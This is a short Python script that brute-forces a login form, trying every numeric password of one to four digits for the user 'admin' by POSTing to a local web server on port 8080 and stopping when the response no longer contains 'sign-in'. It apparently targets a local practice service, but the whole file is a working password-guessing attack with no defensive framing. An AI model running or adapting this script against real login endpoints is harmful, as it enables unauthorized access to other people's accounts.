import itertools
import requests

number = '0123456789'

for len in range(1, 5):
	for password in itertools.product(number, repeat=len):
		pw = ''.join(password)
		print(pw)

		loginPacket = {
			'id' : 'admin',
			'pw' : pw
		} 

		response = requests.post('http://localhost:8080', data=loginPacket)
		if not 'sign-in' in response.text:
			print('Success')
			exit()